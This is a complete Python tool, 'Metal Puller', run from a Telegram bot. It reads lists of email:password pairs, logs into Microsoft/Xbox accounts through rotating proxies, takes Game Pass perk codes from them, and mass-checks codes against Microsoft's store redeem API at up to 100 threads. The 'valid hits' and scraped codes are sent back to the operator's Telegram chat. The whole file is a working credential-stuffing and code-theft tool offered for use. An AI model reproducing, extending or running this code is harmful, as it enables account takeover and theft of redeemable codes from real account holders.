#!/usr/bin/env python3
"""
⚡ METAL PULLER - ULTIMATE RAILWAY TELEGRAM CPM EDITION ⚡
====================================================================
PLATFORM: Railway Headless (No Tkinter, No Inputs, Pure Async Telegram)
FEATURES: Full Functions Retained, Extreme CPM Parallelization, Multi-File Ingestion
====================================================================
"""

import requests
import re
import json
import time
import random
import string
import os
import sys
import queue
import threading
import uuid
import hashlib
import platform
from datetime import datetime
from typing import Optional, Tuple, List, Dict, Set, Any
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from colorama import init, Fore, Style

# System config override for maximize networking limits
sys.dont_write_bytecode = True

# ============================================================================
# TELEGRAM CREDENTIALS (REPLACE WITH YOUR LIVE CREDENTIALS)
# ============================================================================
# Botunun çalışması için token ve chat_id bilgilerini buraya gir veya Railway Env olarak ayarla
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
AUTHORIZED_CHAT_ID = os.environ.get("AUTHORIZED_CHAT_ID", "YOUR_CHAT_ID_HERE")

# ============================================================================
# GLOBAL CONSTANTS & LOCKS
# ============================================================================
VERSION = "5.0.0-TELEGRAM-CPM"
CONFIG_FILE = "pgs_config.json"
PROXY_FILE = "proxies.txt"
ACCOUNTS_FILE = "accounts.txt"
CODES_FILE = "codes.txt"

print_lock = Lock()
results_lock = Lock()
processed_codes_lock = Lock()
file_write_lock = Lock()

# Global metrics engine
DASHBOARD_STATS = {
    "start_time": 0,
    "accounts_configured": 0,
    "codes_extracted": 0,
    "validated_total": 0,
    "valid": 0,
    "valid_requires_card": 0,
    "balance_codes": 0,
    "invalid": 0,
    "region_locked": 0,
    "unknown": 0,
    "rate_limited_accounts_count": 0,
    "active_threads": 0,
    "is_running": False
}

# ============================================================================
# INTERIOR CONFIGURATION SYSTEM
# ============================================================================
def load_config() -> Dict[str, Any]:
    default_config = {
        "fetch_threads": 80,       # Ultra High CPM for Scraper on Railway
        "validate_threads": 100,   # Maximize Parallel pipeline execution nodes
        "max_threads": 150,
        "timeout_seconds": 8,      # Reduced timeout for maximized CPM speed
        "retry_count": 2,
        "market_region": "US",
        "locale_string": "en-US",
        "user_agent_pool": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        ]
    }
    return default_config

CONFIG = load_config()

# ============================================================================
# CORE PARSING & EXTRACTION MODULES (RETAINED FROM ORIGINAL)
# ============================================================================
def safe_print(text: str):
    with print_lock:
        print(text)

def format_proxy_connection(proxy_str: str) -> Optional[Dict[str, str]]:
    try:
        proxy_str = proxy_str.strip()
        if not proxy_str: return None
        if "@" in proxy_str:
            credentials, address = proxy_str.split("@", 1)
            username, password = credentials.split(":", 1)
            formatted = f"http://{username}:{password}@{address}"
        elif proxy_str.count(":") == 3:
            ip, port, user, password = proxy_str.split(":")
            formatted = f"http://{user}:{password}@{ip}:{port}"
        else:
            formatted = f"http://{proxy_str}"
        return {"http": formatted, "https": formatted}
    except Exception:
        return None

def get_random_proxy_element(proxy_pool: List[str]) -> Optional[Dict[str, str]]:
    if not proxy_pool: return None
    return format_proxy_connection(random.choice(proxy_pool))

# ============================================================================
# ORIGINAL MICROSOFT AUTH & GAME PASS CODES ENGINE
# ============================================================================
MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

def fetch_oauth_tokens(session: requests.Session) -> Tuple[Optional[str], Optional[str]]:
    try:
        response = session.get(MICROSOFT_OAUTH_URL, timeout=CONFIG["timeout_seconds"])
        text = response.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match: return None, None
        ppft = match.group(1)
        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match: return None, None
        return match.group(1), ppft
    except Exception:
        return None, None

def fetch_login(session: requests.Session, email: str, passw: str, url_post: str, ppft: str) -> Optional[str]:
    try:
        payload = {'login': email, 'loginfmt': email, 'passwd': passw, 'PPFT': ppft}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp = session.post(url_post, data=payload, headers=headers, allow_redirects=True, timeout=CONFIG["timeout_seconds"])
        if '#' in resp.url:
            token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
            if token != 'None': return token
    except Exception:
        pass
    return None

def get_xbox_tokens(session: requests.Session, rps_token: str) -> Tuple[Optional[str], Optional[str]]:
    try:
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
            json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
            headers={'Content-Type': 'application/json'}, timeout=CONFIG["timeout_seconds"])
        if resp.status_code != 200: return None, None
        user_token = resp.json().get('Token')
        
        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
            json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
            headers={'Content-Type': 'application/json'}, timeout=CONFIG["timeout_seconds"])
        if resp.status_code != 200: return None, None
        return resp.json().get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), resp.json().get('Token')
    except Exception:
        return None, None

def fetch_codes_from_xbox(session: requests.Session, uhs: str, xsts_token: str) -> List[str]:
    try:
        auth = f'XBL3.0 x={uhs};{xsts_token}'
        resp = session.get('https://profile.gamepass.com/v2/offers',
            headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=CONFIG["timeout_seconds"])
        if resp.status_code != 200: return []
        
        codes = []
        for offer in resp.json().get('offers', []):
            resource = offer.get('resource')
            if resource:
                codes.append(resource)
        return codes
    except Exception:
        return []

def fetch_account_worker(email: str, password: str, idx: int, total: int, proxy_pool: List[str] = None) -> List[str]:
    session = requests.Session()
    session.headers.update({'User-Agent': random.choice(CONFIG["user_agent_pool"])})
    if proxy_pool:
        px = get_random_proxy_element(proxy_pool)
        if px: session.proxies = px
            
    try:
        url_post, ppft = fetch_oauth_tokens(session)
        if not url_post: return []
        rps = fetch_login(session, email, password, url_post, ppft)
        if not rps: return []
        uhs, xsts = get_xbox_tokens(session, rps)
        if not uhs: return []
        codes = fetch_codes_from_xbox(session, uhs, xsts)
        with results_lock:
            DASHBOARD_STATS["codes_extracted"] += len(codes)
        return codes
    except Exception:
        return []
    finally:
        session.close()

# ============================================================================
# HIGH SPEED VERIFIER MOTOR
# ============================================================================
def generate_reference_id() -> str:
    n = f'{int(time.time() // 30):08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    return "".join([n[(e - 1) // 8] if e % 8 == 1 else o[e] for e in range(64)])

def login_microsoft_account(email: str, password: str, proxies: Optional[Dict[str, str]] = None) -> Optional[requests.Session]:
    session = requests.Session()
    if proxies: session.proxies = proxies
    session.headers = {'User-Agent': CONFIG["user_agent_pool"][0]}
    try:
        login_response = session.post(
            f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7",
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
            timeout=CONFIG["timeout_seconds"]
        )
        reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_response.text.replace('\\', ''))
        if not reurl_match: return None
        reresp = session.get(reurl_match.group(1), timeout=CONFIG["timeout_seconds"]).text
        actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
        if not actch: return None
        input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
        final_response = session.post(actch.group(1), data={name: value for name, value in input_matches}, timeout=CONFIG["timeout_seconds"])
        if final_response.status_code == 200: return session
    except Exception:
        pass
    return None

def get_auth_token(session: requests.Session) -> Optional[str]:
    try:
        if hasattr(session, 'wlid_token'): return session.wlid_token
        token_response = session.get('https://account.microsoft.com/auth/acquire-onbehalf-of-token', params={'scopes': 'MSComServiceMBISSL'}, timeout=CONFIG["timeout_seconds"])
        token = token_response.json()[0]['token']
        session.wlid_token = token
        return token
    except Exception:
        return None

def get_store_cart_state(session: requests.Session) -> Optional[Dict[str, str]]:
    try:
        if hasattr(session, 'store_state'): return session.store_state
        token = get_auth_token(session)
        if not token: return None
        payload = {'data': '{"usePurchaseSdk":true}', 'market': CONFIG["market_region"], 'locale': CONFIG["locale_string"], 'msaTicket': token, 'isRedeem': 'true', 'scenario': 'redeem'}
        response = session.post('https://www.microsoft.com/store/purchase/buynowui/redeemnow', data=payload, timeout=CONFIG["timeout_seconds"])
        match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', response.text, re.DOTALL)
        if not match: return None
        store_state = json.loads(match.group(1))
        extracted = {
            'ms_cv': store_state.get('appContext', {}).get('cv', ''),
            'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
            'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
            'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
            'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
        }
        session.store_state = extracted
        return extracted
    except Exception:
        return None

def validate_code_primary(session: requests.Session, code: str) -> Dict[str, Any]:
    try:
        store_state = get_store_cart_state(session)
        token = get_auth_token(session)
        if not store_state or not token: return {"status": "ERROR", "message": "Handshake Rejection"}
        
        headers = {
            "x-ms-tracking-id": store_state['tracking_id'], "authorization": f"WLID1.0=t={token}",
            "x-ms-market": CONFIG["market_region"], "ms-cv": store_state['ms_cv'],
            "x-ms-reference-id": generate_reference_id(), "x-ms-vector-id": store_state['vector_id'],
            "user-agent": CONFIG["user_agent_pool"][0], "x-ms-correlation-id": store_state['correlation_id'],
            "content-type": "application/json", "x-authorization-muid": store_state['alternative_muid']
        }
        payload = {"market": CONFIG["market_region"], "language": CONFIG["locale_string"], "tokenIdentifierValue": code, "buyNowScenario": "redeem", "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}}
        
        url = 'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken'
        response = session.post(url, headers=headers, json=payload, timeout=CONFIG["timeout_seconds"])
        
        if response.status_code == 429: return {"status": "RATE_LIMITED", "message": "429 Limited"}
        data = response.json()
        
        if "tokenType" in data and data["tokenType"] == "CSV":
            return {"status": "BALANCE_CODE", "message": f"{code} | {data.get('value')} {data.get('currency')}"}
        if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
            reason = data["events"]["cart"][0].get("data", {}).get("reason", "")
            if reason == "RedeemTokenAlreadyRedeemed": return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
            if reason == "RedeemTokenGeoFencingError": return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
            if reason in ["RedeemTokenNotFound", "InvalidProductKey"]: return {"status": "INVALID", "message": f"{code} | INVALID"}
            
        if "products" in data and len(data["products"]) > 0:
            title = data["products"][0].get("title", "Game Pass Asset")
            status_type = "VALID_REQUIRES_CARD" if data.get("productInfos", [{}])[0].get("isPIRequired", False) else "VALID"
            return {"status": status_type, "message": f"{code} | {title}"}
            
        return {"status": "UNKNOWN", "message": f"{code} | Unknown"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

# ============================================================================
# CODES CLASS SORTING SYSTEM
# ============================================================================
def extract_game_type(game_name: str) -> str:
    game_name = game_name.upper()
    if 'SUNSET' in game_name: return '🥤 Sunset Sarsaparilla Bundle'
    elif 'SIEGE' in game_name or 'RAINBOW' in game_name: return '🔫 Rainbow Six Siege Pack'
    elif 'SKATE' in game_name: return '🛹 Skate Supercharge Pack'
    elif 'WARFRAME' in game_name: return '⚔️ Warframe Content Bundle'
    elif 'GAME PASS' in game_name: return '🎮 Xbox Game Pass Membership'
    return '🎁 Standard Game Perks'

def sort_results_file(input_file: str, output_file: str):
    game_groups = {}
    if not os.path.exists(input_file): return
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or '|' not in line: continue
            parts = line.split('|', 1)
            cat = extract_game_type(parts[1])
            if cat not in game_groups: game_groups[cat] = []
            game_groups[cat].append((parts[0].strip(), parts[1].strip()))
            
    with open(output_file, 'w', encoding='utf-8') as out_f:
        for cat, pairs in game_groups.items():
            out_f.write(f"\n📋 {cat} [Count: {len(pairs)}]\n" + "-"*50 + "\n")
            for c, d in pairs: out_f.write(f"{c} | {d}\n")

# ============================================================================
# PIPELINE WORKERS FOR MAXIMUM RAILWAY CPM
# ============================================================================
def process_checker_pipeline(accounts: list, codes: list, proxies: list, result_dir: str):
    code_queue = queue.Queue()
    for c in codes: code_queue.put(c)
    processed_set = set()
    rate_limited_accounts = []
    
    valid_path = f"{result_dir}/valid.txt"
    invalid_path = f"{result_dir}/invalid.txt"
    
    def worker(account):
        email, password = account
        px = get_random_proxy_element(proxies)
        session = login_microsoft_account(email, password, px)
        if not session: return
        
        while not code_queue.empty() and email not in rate_limited_accounts:
            try: code = code_queue.get_nowait()
            except queue.Empty: break
            
            if code in processed_set:
                code_queue.task_done()
                continue
                
            res = validate_code_primary(session, code)
            status = res.get('status')
            
            with results_lock:
                DASHBOARD_STATS["validated_total"] += 1
                
            if status == 'RATE_LIMITED':
                rate_limited_accounts.append(email)
                code_queue.put(code)
            elif status in ['VALID', 'VALID_REQUIRES_CARD', 'BALANCE_CODE']:
                with results_lock: DASHBOARD_STATS["valid"] += 1
                with file_write_lock:
                    with open(valid_path, 'a') as f: f.write(f"{res['message']}\n")
                processed_set.add(code)
            elif status in ['INVALID', 'REDEEMED', 'EXPIRED']:
                with results_lock: DASHBOARD_STATS["invalid"] += 1
                with file_write_lock:
                    with open(invalid_path, 'a') as f: f.write(f"{res['message']}\n")
                processed_set.add(code)
            else:
                code_queue.put(code)
            code_queue.task_done()

    # Extreme Dynamic Threading Matrix
    threads_count = min(CONFIG["validate_threads"], len(accounts))
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        executor.map(worker, accounts)

# ============================================================================
# PURE TELEGRAM ENGINE INTERFACE (NON-BLOCKING)
# ============================================================================
def send_telegram_message(text: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": AUTHORIZED_CHAT_ID, "text": text, "parse_mode": "Markdown"})
    except Exception: pass

def send_telegram_document(file_path: str, caption: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={"chat_id": AUTHORIZED_CHAT_ID, "caption": caption}, files={"document": f})
    except Exception: pass

def get_telegram_updates(offset=None) -> list:
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    try:
        r = requests.get(url, params={"offset": offset, "timeout": 20}, timeout=25)
        return r.json().get("result", [])
    except Exception:
        return []

def download_telegram_file(file_id: str, local_path: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
    try:
        res = requests.get(url, params={"file_id": file_id}).json()
        file_path = res.get("result", {}).get("file_path")
        file_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
        data = requests.get(file_url).content
        with open(local_path, 'wb') as f: f.write(data)
        return True
    except Exception:
        return False

# ============================================================================
# CENTRAL RUNTIME COORDINATOR
# ============================================================================
def telegram_listener_loop():
    print("[+] Metal Puller Telegram Core Infrastructure Engaged.")
    offset = None
    
    # Başlangıç Durum Bilgilendirmesi
    send_telegram_message("⚡ *METAL PULLER ONLINE (RAILWAY ACTIVE)* ⚡\n\n"
                          "Pls upload files:\n"
                          "1️⃣ Send `accounts.txt`\n"
                          "2️⃣ Send `codes.txt`\n"
                          "3️⃣ Send `proxies.txt` (Optional)\n\n"
                          "Commands:\n"
                          "▶️ /scrape - Launch High-Speed Scraper Pipeline\n"
                          "▶️ /check - Start High CPM Verification System\n"
                          "📊 /status - Real-Time Dashboard Stats Update")

    while True:
        updates = get_telegram_updates(offset)
        for update in updates:
            offset = update.get("update_id") + 1
            message = update.get("message", {})
            chat_id = str(message.get("chat", {}).get("id", ""))
            
            # Simple Access Control Shield
            if chat_id != AUTHORIZED_CHAT_ID and AUTHORIZED_CHAT_ID != "YOUR_CHAT_ID_HERE":
                continue
                
            text = message.get("text", "").strip()
            document = message.get("document", {})
            
            # FILE INGESTION SUB-SYSTEM
            if document:
                f_name = document.get("file_name", "")
                f_id = document.get("file_id")
                if f_name in [ACCOUNTS_FILE, CODES_FILE, PROXY_FILE]:
                    if download_telegram_file(f_id, f_name):
                        send_telegram_message(f"✅ Received and storage synced: `{f_name}`")
                    else:
                        send_telegram_message(f"❌ Storage write failure for `{f_name}`")

            # COMMAND ROUTING MATRIX
            if text == "/status":
                if DASHBOARD_STATS["is_running"]:
                    uptime = int(time.time() - DASHBOARD_STATS["start_time"])
                    send_telegram_message(f"📊 *SYSTEM ACTIONS RUNNING*\n"
                                          f"⏱️ Runtime Active: {uptime}s\n"
                                          f"📥 Validated: {DASHBOARD_STATS['validated_total']}\n"
                                          f"🟢 Valid / Balance: {DASHBOARD_STATS['valid']}\n"
                                          f"🔴 Bad / Spent: {DASHBOARD_STATS['invalid']}")
                else:
                    send_telegram_message("💤 Systems Standby Engine Idle. Send files then call action flags.")
                    
            elif text == "/scrape":
                if DASHBOARD_STATS["is_running"]:
                    send_telegram_message("⚠️ Error: Thread Lock collision. Worker pipeline already busy.")
                    continue
                threading.Thread(target=run_async_scraper_pipeline).start()
                
            elif text == "/check":
                if DASHBOARD_STATS["is_running"]:
                    send_telegram_message("⚠️ Error: Thread Lock collision. Worker pipeline already busy.")
                    continue
                threading.Thread(target=run_async_checker_pipeline).start()
                
        time.sleep(1)

def run_async_scraper_pipeline():
    DASHBOARD_STATS["is_running"] = True
    send_telegram_message("🚀 *SCRAPER PIPELINE TRIGGERED ON RAILWAY* - Connecting threads...")
    
    # Safe fallback parsing execution maps
    accounts = []
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, 'r') as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line and not line.startswith('#')]
            
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f: proxies = [l.strip() for l in f if l.strip()]

    if not accounts:
        send_telegram_message("❌ Ingestion Failure: `accounts.txt` missing or structural parameters broken.")
        DASHBOARD_STATS["is_running"] = False
        return
        
    DASHBOARD_STATS["codes_extracted"] = 0
    all_scraped = []
    
    with ThreadPoolExecutor(max_workers=CONFIG["fetch_threads"]) as executor:
        futs = [executor.submit(fetch_account_worker, acc[0], acc[1], i, len(accounts), proxies) for i, acc in enumerate(accounts)]
        for fut in as_completed(futs):
            all_scraped.extend(fut.result())
            
    if all_scraped:
        with open(CODES_FILE, 'w') as f: f.write("\n".join(all_scraped) + "\n")
        send_telegram_document(CODES_FILE, f"✅ Scraper completed execution! Total extracted tokens: {len(all_scraped)}")
    else:
        send_telegram_message("⚠️ Scraper finalized. Total codes extracted: 0.")
    DASHBOARD_STATS["is_running"] = False

def run_async_checker_pipeline():
    DASHBOARD_STATS["is_running"] = True
    DASHBOARD_STATS["start_time"] = time.time()
    DASHBOARD_STATS["validated_total"] = 0
    DASHBOARD_STATS["valid"] = 0
    DASHBOARD_STATS["invalid"] = 0
    
    send_telegram_message("🔥 *HIGH-CPM VALIDATOR ENGINE LAUNCHED* - Maximizing thread allocations...")
    
    accounts = []
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, 'r') as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    codes = []
    if os.path.exists(CODES_FILE):
        with open(CODES_FILE, 'r') as f: codes = [l.strip() for l in f if l.strip()]
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f: proxies = [l.strip() for l in f if l.strip()]
        
    if not accounts or not codes:
        send_telegram_message("❌ Execution Denied: `accounts.txt` or `codes.txt` payloads empty.")
        DASHBOARD_STATS["is_running"] = False
        return
        
    runtime_dir = "results/run_output"
    os.makedirs(runtime_dir, exist_ok=True)
    
    # Flush clean state mappings
    if os.path.exists(f"{runtime_dir}/valid.txt"): os.remove(f"{runtime_dir}/valid.txt")
    if os.path.exists(f"{runtime_dir}/invalid.txt"): os.remove(f"{runtime_dir}/invalid.txt")
    
    process_checker_pipeline(accounts, codes, proxies, runtime_dir)
    
    # Classify and Sort Valid Codes outputs immediately
    sorted_path = f"{runtime_dir}/sorted_valid_report.txt"
    if os.path.exists(f"{runtime_dir}/valid.txt"):
        sort_results_file(f"{runtime_dir}/valid.txt", sorted_path)
        send_telegram_document(sorted_path, "🟢 CLASSIFIED VALID HIT REPORT")
        send_telegram_document(f"{runtime_dir}/valid.txt", "📄 RAW VALID HITS")
    else:
        send_telegram_message("🔴 Checker run finished. 0 Valid hits discovered.")
        
    DASHBOARD_STATS["is_running"] = False

# ============================================================================
# RAILWAY PROCESS ENTRY BOUNDARY
# ============================================================================
if __name__ == '__main__':
    # Telegram Bot Polling execution loop launch
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[!] CONFIG ERROR: Please populate target active TELEGRAM_BOT_TOKEN parameters setup mapping rules.")
        sys.exit(1)
    telegram_listener_loop()

